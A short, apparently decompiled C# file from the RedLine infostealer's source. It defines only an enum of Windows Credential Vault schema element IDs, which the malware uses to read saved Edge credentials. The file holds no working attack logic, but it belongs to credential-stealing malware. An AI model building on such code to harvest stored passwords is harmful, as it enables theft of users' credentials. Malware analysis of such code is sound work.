namespace RedLine.Models.Browsers.Edge
{
  public enum VAULT_SCHEMA_ELEMENT_ID
  {
    Illegal = 0,
    Resource = 1,
    Identity = 2,
    Authenticator = 3,
    Tag = 4,
    PackageSid = 5,
    AppStart = 100, // 0x00000064
    AppEnd = 10000, // 0x00002710
  }
}
